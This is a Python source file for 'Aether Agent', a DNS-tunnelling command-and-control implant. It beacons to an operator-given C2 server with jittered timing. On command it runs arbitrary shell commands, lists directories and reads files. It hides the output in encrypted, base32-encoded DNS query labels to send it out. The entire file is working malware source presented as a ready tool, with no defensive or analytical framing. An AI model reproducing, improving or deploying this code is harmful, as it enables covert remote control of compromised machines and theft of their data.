#!/usr/bin/env python3
"""
aether_agent.py - Production-Grade Standalone Deployment Agent.
Implements AES-256-GCM AEAD encryption pipeline wrappers, zlib compression,
malleable jitter intervals, and error shielding.
"""

import os
import sys
import subprocess
import time
import socket
import base64
import zlib
import random
import argparse
from Cryptodome.Cipher import AES

C2_SERVER = ""
ZONE_DOMAIN = ""
SHARED_CRYPTO_KEY = b"AetherFrameworkSecureKey2026!!!!"
LABEL_CHUNK_SIZE = 24
BEACON_SLEEP_BASE = 4.0

cached_stream_matrix = {}
active_transfer_name = ""
_qseq = 0  # monotonic nonce so every QNAME is unique (avoids resolver cache hits)


def _next_qnonce():
    """Return a new label-safe nonce for outbound QNAMEs."""
    global _qseq
    _qseq += 1
    return str(_qseq)


def encrypt_payload(raw_bytes):
    """Encrypts outgoing data payloads using AES-256-GCM with integrated nonces."""
    compressed_bytes = zlib.compress(raw_bytes)
    
    cipher = AES.new(SHARED_CRYPTO_KEY, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(compressed_bytes)
    
    # Pack binary into standard transport envelope: [IV] + [TAG] + [CIPHERTEXT]
    packaged_binary = cipher.nonce + tag + ciphertext
    return base64.b32encode(packaged_binary).decode().lower().replace("=", "")

def transmit_dns_query(subdomain):
    """Issues standard recursive lookup frames directly targeting the controller endpoint."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)
    packet = b"\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    for part in f"{subdomain}.{ZONE_DOMAIN}".split("."):
        packet += bytes([len(part)]) + part.encode()
    packet += b"\x00\x00\x01\x00\x01"
    
    try:
        sock.sendto(packet, (C2_SERVER, 53))
        response, _ = sock.recvfrom(2048)
        sock.close()
        return response
    except Exception:
        sock.close()
        return b""

def dispatch_stream(name, raw_data_bytes):
    global cached_stream_matrix, active_transfer_name
    active_transfer_name = name
    cached_stream_matrix = {}
    
    b32_ciphertext = encrypt_payload(raw_data_bytes)
    
    seq = 0
    for i in range(0, len(b32_ciphertext), LABEL_CHUNK_SIZE):
        cached_stream_matrix[seq] = b32_ciphertext[i:i+LABEL_CHUNK_SIZE]
        seq += 1
        
    transmit_dns_query(f"str-{seq}-{name}")
    time.sleep(0.05)
    
    for seq_id, data_chunk in cached_stream_matrix.items():
        transmit_dns_query(f"chk-{seq_id}-{data_chunk}")
        time.sleep(0.01)
        
    time.sleep(0.05)
    evaluate_server_feedback(transmit_dns_query(f"end-{name}.{_next_qnonce()}"))

def evaluate_server_feedback(response_packet):
    global cached_stream_matrix, active_transfer_name
    if len(response_packet) < 16: return
    
    cmd_str = response_packet[-4:].decode(errors='ignore').strip()
    if cmd_str.startswith("R"):
        target_seq = int(cmd_str[1:])
        if target_seq in cached_stream_matrix:
            transmit_dns_query(f"chk-{target_seq}-{cached_stream_matrix[target_seq]}")
        time.sleep(0.05)
        evaluate_server_feedback(transmit_dns_query(f"end-{active_transfer_name}.{_next_qnonce()}"))
    elif cmd_str == "DONE":
        cached_stream_matrix, active_transfer_name = {}, ""

def execute_beacon_cycle():
    # Unique QNAME each beacon (empty payload still needs a changing label)
    res = transmit_dns_query(f"beacon.{_next_qnonce()}")
    if len(res) < 16: return
    
    cmd_str = res[-4:].decode(errors='ignore').strip()
    if cmd_str in ["ACK", "DONE", ""] or cmd_str.startswith("R"): return
    
    opt, arg = cmd_str, cmd_str[1:]
    if opt == "1":
        try:
            dispatch_stream("ls_output.txt", "\n".join(os.listdir(arg or ".")).encode())
        except Exception as e:
            dispatch_stream("ls_output.txt", str(e).encode())
    elif opt == "2":
        proc = subprocess.run(arg, shell=True, capture_output=True)
        output = proc.stdout + proc.stderr or b"[+] Command processed without output strings."
        dispatch_stream("command_log.txt", output)
    elif opt == "3" and os.path.isfile(arg):
        with open(arg, "rb") as f:
            dispatch_stream(os.path.basename(arg), f.read())

def main():
    global C2_SERVER, ZONE_DOMAIN
    
    parser = argparse.ArgumentParser(description="Aether Agent - Dynamic DNS C2 Execution Unit.")
    parser.add_argument("-s", "--server", required=True, help="IP address of the authoritative C2 listener server.")
    parser.add_argument("-d", "--domain", default="aether.internal", help="The base zone domain used for protocol routing.")
    args = parser.parse_args()
    
    C2_SERVER = args.server
    ZONE_DOMAIN = args.domain
    
    print(f"[*] Aether Agent Initialized. Targeting C2 Server {C2_SERVER} over zone {ZONE_DOMAIN}...")
    
    while True:
        try:
            execute_beacon_cycle()
        except Exception:
            pass
        
        # Malleable Jitter Logic: Introduces a random +/- 30% timing offset
        jitter_factor = random.uniform(-0.30, 0.30)
        calculated_sleep = BEACON_SLEEP_BASE + (BEACON_SLEEP_BASE * jitter_factor)
        time.sleep(max(1.0, calculated_sleep))

if __name__ == "__main__":
    main()

